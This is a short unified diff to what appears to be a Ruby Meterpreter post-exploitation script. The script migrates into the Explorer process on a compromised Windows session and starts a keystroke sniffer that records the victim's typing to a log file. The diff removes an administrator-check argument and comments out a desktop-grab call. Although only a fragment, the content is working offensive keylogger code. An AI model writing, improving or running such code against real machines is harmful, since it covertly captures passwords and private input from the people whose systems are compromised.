@@ -36,7 +36,7 @@ captype = 0
 )
 
 #Function to Migrate in to Explorer process to be able to interact with desktop
-def explrmigrate(session,captype,adm)
+def explrmigrate(session,captype)
 	begin
 		print_status("Migrating process...")
 		if captype.to_i == 0
@@ -64,8 +64,8 @@ end
 #Function for starting the keylogger
 def startkeylogger(session)
 	begin
-		print_status("Grabbing Desktop Keyboard Input...")
-		session.ui.grab_desktop
+		#print_status("Grabbing Desktop Keyboard Input...")
+		#session.ui.grab_desktop
 		print_status("Starting the keystroke sniffer...") 
 		session.ui.keyscan_start
 		return true
@@ -154,8 +154,7 @@ helpcall = 0
 
 }
 if helpcall == 0
-	adm = checkifadm(session)
-	if explrmigrate(session,captype,adm)
+	if explrmigrate(session,captype)
 		if startkeylogger(session)
 			keycap(session, keytime, logfile)
 		end
